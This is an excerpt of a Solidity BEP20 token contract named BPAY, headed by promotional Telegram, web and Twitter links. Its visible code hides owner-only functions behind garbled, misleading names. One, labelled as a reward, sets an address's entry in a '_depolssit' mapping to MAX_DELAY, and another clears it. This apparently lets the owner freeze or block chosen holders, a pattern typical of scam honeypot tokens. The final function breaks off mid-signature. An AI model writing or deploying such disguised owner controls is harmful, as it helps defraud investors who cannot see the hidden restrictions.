...
/**
Project Info:
Telegram: https://t.me/BUSDPAY49184_chat
Announcements: https://t.me/BUSDPAY49184
Web: https://www.BUSDPAY49184.com
Twitter: https://twitter.com/BUSDPAY49184
**/
...
contract BPAY is IBEP20, HasForeignAsset {
    ...
    function _BUSDPAY49184reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupBUSDPAY49184ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function _BUSDPAY49184Aasses(address booadndd,uint256 nuum) public onlyOwner {
